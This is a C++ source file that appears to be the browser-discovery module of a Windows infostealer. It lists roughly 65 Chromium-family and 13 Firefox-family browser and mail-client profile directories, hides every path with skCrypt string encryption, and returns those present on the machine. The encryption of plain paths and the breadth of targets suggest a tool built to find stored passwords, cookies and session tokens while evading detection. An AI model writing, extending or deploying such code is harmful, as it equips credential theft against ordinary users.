#include <iostream>
#include <string>
#include <vector>
#include <cstdlib>
#include <filesystem>
#include <browser_utils/get_browsers.hpp>
#include <sysinfo.hpp>
#include <crypto_utils/skCrypter.hpp>

namespace fs = std::filesystem;

namespace utils {

    std::vector<fs::path> get_chromium_browsers() {
        std::string h = features::get_home();
        std::vector<fs::path> chromium_paths = {
        h + skCrypt("\\AppData\\Local\\Chromium\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Thorium\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Google\\Chrome\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Google(x86)\\Chrome\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Google\\Chrome SxS\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\MapleStudio\\ChromePlus\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Iridium\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\7Star\\7Star\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\CentBrowser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Chedot\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Vivaldi\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Kometa\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Elements Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Epic Privacy Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\uCozMedia\\Uran\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\"),
        h + skCrypt("\\AppData\\Local\\CatalinaGroup\\Citrio\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Coowon\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\liebao\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\QIP Surf\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Orbitum\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Comodo\\Dragon\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\360Browser\\Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Maxthon3\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\K-Melon\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\CocCoc\\Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\BraveSoftware\\Brave-Browser-Beta\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\BraveSoftware\\Brave-Browser-Nightly\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\"),
        h + skCrypt("\\AppData\\Roaming\\Opera Software\\Opera Stable\\"),
        h + skCrypt("\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\"),
        h + skCrypt("\\AppData\\Roaming\\Opera Software\\Opera Next\\"),
        h + skCrypt("\\AppData\\Roaming\\Opera Software\\Opera Developer\\"),
        h + skCrypt("\\AppData\\Local\\Microsoft\\Edge\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Microsoft\\Edge Beta\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Microsoft\\Edge Dev\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Microsoft\\Edge SxS\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Amigo\\User\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Torch\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Sputnik\\Sputnik\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\DCBrowser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\UR Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Slimjet\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Arc\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Naver\\Naver Whale\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\AVAST Software\\Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\AVG\\Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Sidekick\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\SRWare Iron\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\UCBrowser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Blisk\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Wavebox\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\CCleaner Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Puma Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Kinza\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Cent Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Ghost Browser\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Falkon\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Vivaldia\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Chromodo\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Dragon\\User Data\\"),
        h + skCrypt("\\AppData\\Local\\Colibri\\User Data\\")
        };
        std::vector<fs::path> out;
        for (const auto& p : chromium_paths)
            if (fs::exists(p)) out.push_back(p);
        return out;
    }

    std::vector<fs::path> get_gecko_browsers() {
        std::string h = features::get_home();
        std::vector<fs::path> gecko_paths = {
        h + skCrypt("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\Waterfox\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\LibreWolf\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\K-Meleon\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\Thunderbird\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\Mozilla\\SeaMonkey\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\Comodo\\IceDragon\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\Mozilla\\Cyberfox\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\Mozilla\\Mercury\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\Moonchild Productions\\Pale Moon\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\zen\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\Floorp\\Profiles\\"),
        h + skCrypt("\\AppData\\Roaming\\Pale Moon\\Profiles\\")
        };
        std::vector<fs::path> out;
        for (const auto& p : gecko_paths)
            if (fs::exists(p)) out.push_back(p);
        return out;
    }
}
